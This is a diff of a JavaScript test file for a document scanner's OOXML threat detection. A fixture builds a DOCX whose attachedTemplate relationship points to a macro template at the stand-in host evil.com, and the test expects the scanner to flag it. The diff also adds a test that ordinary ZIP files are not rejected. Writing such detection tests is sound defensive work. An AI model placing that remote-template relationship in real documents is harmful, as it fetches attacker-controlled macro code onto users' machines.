@@ -756,8 +756,9 @@ describe("ooxml threats", () => {
     const buffer = await makeThreatDocx({
       relsXml:
         '<?xml version="1.0"?>' +
-        "<Relationships>" +
-        '<Relationship Type="attachedTemplate" ' +
+        '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">' +
+        '<Relationship Id="rId1" ' +
+        'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" ' +
         'Target="https://evil.com/template.dotm"/>' +
         "</Relationships>",
     });
@@ -772,6 +773,24 @@ describe("ooxml threats", () => {
     expect(r.findings.some((f) => f.rule === "ooxml_attached_template")).toBe(
       true,
     );
+  });
+
+  test("ordinary ZIP files with non-OPC .rels entries are not rejected", async () => {
+    const zip = new JSZip();
+    zip.file("notes.rels", "not XML");
+    const result = Result.unwrap(
+      await scanFile({
+        buffer: await zip.generateAsync({ type: "uint8array" }),
+        declaredMimeType: "application/zip",
+        fileName: "notes.zip",
+      }),
+    );
+
+    expect(
+      result.findings.some(
+        ({ rule }) => rule === "ooxml_relationships_unreadable",
+      ),
+    ).toBe(false);
   });
 
   test("DOCX with a local attached template → reject without calling it remote", async () => {
